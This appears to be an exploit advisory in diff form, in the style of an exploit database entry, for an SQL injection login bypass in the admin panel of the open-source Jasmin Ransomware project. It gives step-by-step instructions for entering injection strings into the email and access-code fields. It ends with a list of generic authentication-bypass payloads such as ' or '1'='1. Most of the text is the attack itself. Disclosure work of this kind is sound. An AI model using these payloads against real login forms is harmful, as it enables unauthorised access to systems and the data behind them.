@@ -1,0 +1,34 @@
+# Exploit Title: Jasmin Ransomware SQL Injection Login Bypass
+# Google Dork: N/A
+# Date: 05-03-2025
+# Exploit Author: Buğra Enis Dönmez
+# Vendor Homepage: https://github.com/codesiddhant/Jasmin-Ransomware
+# Software Link: https://github.com/codesiddhant/Jasmin-Ransomware
+# Version: N/A
+# Tested on: Windows
+
+How to exploit :
+
+--> Open Admin Panel Through : http://localhost/login.php
+
+--> Enter the SQL Injection Auth Bypass Payload to Email like : '=' 'or'
+
+--> And to Access Code, Enter the same SQL Injection Authentication Bypass Payload : '=' 'or'
+
+--> Press Authorize
+
+--> Congratz, you're in
+
+--> SQL Injection Authentication Bypass Payload : '=' 'or'
+
+--> Payloads Can be use :
+
+' or '1'='1
+
+' or ''='
+
+'=' 'or'
+
+' OR '1'='1';-- -
+
+' or 1 -- -
